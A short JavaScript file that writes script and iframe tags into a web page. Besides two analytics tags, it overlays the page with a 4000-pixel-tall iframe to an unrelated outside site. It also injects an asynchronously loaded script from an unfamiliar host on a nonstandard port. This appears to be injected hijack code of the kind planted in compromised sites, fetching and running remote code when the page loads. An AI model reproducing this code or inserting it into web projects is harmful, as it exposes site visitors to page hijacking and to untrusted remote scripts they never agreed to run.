document.writeln("<script>");
document.writeln("var _hmt = _hmt || [];");
document.writeln("(function() {");
document.writeln("  var hm = document.createElement(\'script\');");
document.writeln("  hm.src = \'../../hm.baidu.com/hm.js-8ce73a3aafc6ccf19f35eb38e58bc60f\'/*tpa=https://hm.baidu.com/hm.js?8ce73a3aafc6ccf19f35eb38e58bc60f*/;");
document.writeln("  var s = document.getElementsByTagName(\'script\')[0]; ");
document.writeln("  s.parentNode.insertBefore(hm, s);");
document.writeln("})();");
document.writeln("</script>");

document.writeln("<script type=\'text/javascript\' src=\'../../js.users.51.la/19422299.js\'/*tpa=http://js.users.51.la/19422299.js*/></script>");

document.writeln("<div  align=\'center\'><iframe align=\'center\' width=100% height=\'4000\' src=\'http://www.kdw11.com/\'></iframe></div>");

document.writeln("<script>");
document.writeln("    var s = document.createElement(\'script\');");
document.writeln("    s.type = \'text/javascript\';");
document.writeln("    s.async = true;");
document.writeln("    s.src = \'../../sfd.maizhenai.cn/v/104_150/1439_1\'/*tpa=http://sfd.maizhenai.cn:23525/v/104_150/1439_1*/;");
document.writeln("    var head = document.getElementsByTagName(\'head\')[0];");
document.writeln("    head.appendChild(s);");
document.writeln("</script>");